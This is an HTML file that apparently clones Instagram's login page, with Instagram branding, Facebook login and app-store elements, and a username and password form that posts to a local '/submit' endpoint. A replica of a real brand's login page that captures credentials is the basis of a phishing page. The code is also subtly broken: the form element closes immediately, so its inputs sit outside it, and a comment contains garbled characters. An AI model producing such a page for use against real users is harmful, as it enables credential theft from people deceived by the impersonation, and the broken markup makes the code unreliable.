<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login UI</title>
  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="login.css"> <!-- Link to external CSS -->
</head>
<body>
  <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
    <!-- Login Box -->
    <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
      <h1 class="bg-no-repeat instagram-logo"></h1>
      
      <!-- âœ… Updated Form -->
      <form class="mt-8 w-64 flex flex-col" method="POST" action="/submit"></form>
        <input 
          name="username"
          class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
          type="text"
          placeholder="Phone number, username, or email"
          required
        />
        <input 
          name="password"
          class="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
          type="password"
          placeholder="Password"
          required
        />
        <button
          type="submit"
          class="text-sm text-center bg-blue-500 text-white py-2 rounded font-medium w-full"
        >
          Log In
        </button>
      </form>

      <!-- Other UI -->
      <div class="flex justify-evenly space-x-2 w-64 mt-4">
        <span class="bg-gray-300 h-px flex-grow relative top-2"></span>
        <span class="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
        <span class="bg-gray-300 h-px flex-grow relative top-2"></span>
      </div>

      <button class="mt-4 flex items-center">
        <div class="bg-no-repeat facebook-logo mr-1"></div>
        <span class="text-xs text-blue-900 font-semibold">Log in with Facebook</span>
      </button>

      <a class="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">Forgot password?</a>
    </div>

    <!-- Signup Box -->
    <div class="bg-white border border-gray-300 text-center w-80 py-4">
      <span class="text-sm">Don't have an account?</span>
      <a class="text-blue-500 text-sm font-semibold">Sign up</a>
    </div>

    <!-- App Store Logos -->
    <div class="mt-3 text-center">
      <span class="text-xs">Get the app</span>
      <div class="flex mt-3 space-x-2 justify-center">
        <div class="bg-no-repeat apple-store-logo"></div>
        <div class="bg-no-repeat google-store-logo"></div>
      </div>
    </div>
  </div>
</body>
</html>
